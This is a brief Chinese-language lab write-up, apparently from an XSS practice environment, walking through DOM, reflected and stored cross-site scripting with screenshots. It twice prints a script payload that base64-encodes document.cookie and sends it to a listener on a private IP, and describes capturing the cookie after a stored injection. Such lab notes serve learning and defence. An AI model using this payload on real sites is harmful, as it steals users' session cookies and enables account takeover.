xss典型代码：

<script> 
window.open('http://192.168.81.238:2333/?q='+btoa(document.cookie)) 
</script>

**dom型**

完全在前端进行，先随便点两下试试。

![image-20260620172459991](images/image-20260620172459991.png)

![image-20260620172531714](images/image-20260620172531714.png)

发现传参为default，修改传参，类似sql注入的方式。

![image-20260620172737027](images/image-20260620172737027.png)

![image-20260620172754642](images/image-20260620172754642.png)

**反射型**

服务器响应，在后端进行

![image-20260620174046096](images/image-20260620174046096.png)

![image-20260620174153468](images/image-20260620174153468.png)

可以看到抓包也有内容

![image-20260620181333865](images/image-20260620181333865.png)

**存储型**

先打开端口监听

![image-20260620192437726](images/image-20260620192437726.png)

解除字数限制，输入代码

![image-20260620194027326](images/image-20260620194027326.png)

![image-20260620194106616](images/image-20260620194106616.png)

![image-20260620194132297](images/image-20260620194132297.png)

不过alert（）在监听端看不到，使用

<script> 
window.open('http://192.168.2.54:2333/?q='+btoa(document.cookie)) 
</script>

![image-20260620194339407](images/image-20260620194339407.png)

跳转了神秘网页

![image-20260620194407029](images/image-20260620194407029.png)

监听端也有反应了，看看是啥

![image-20260620194606167](images/image-20260620194606167.png)

和弹窗内容一样